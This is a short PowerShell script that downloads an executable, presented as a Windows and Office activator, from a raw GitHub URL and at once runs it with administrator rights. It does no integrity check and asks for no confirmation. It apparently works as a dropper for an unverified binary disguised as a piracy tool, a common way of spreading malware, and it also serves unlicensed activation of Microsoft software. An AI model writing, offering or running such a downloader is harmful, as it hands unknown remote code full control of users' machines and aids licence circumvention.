$FilePath = "Windows10.and.11.Activator.+.Office.Activator.2025.exe"
$DownloadUrl = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"

try {
    Write-Host "Downloading file..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $FilePath
    
    if (Test-Path $FilePath) {
        $fileSize = (Get-Item $FilePath).Length / 1MB
        Write-Host "File downloaded successfully! Size: $([math]::Round($fileSize, 2)) MB" -ForegroundColor Green
        
        Write-Host "Starting program with administrator rights..." -ForegroundColor Cyan
        Start-Process -FilePath $FilePath -Verb RunAs
    } else {
        Write-Error "Error: File was not downloaded"
    }
}
catch {
    Write-Error "Download error: $_"
    pause
}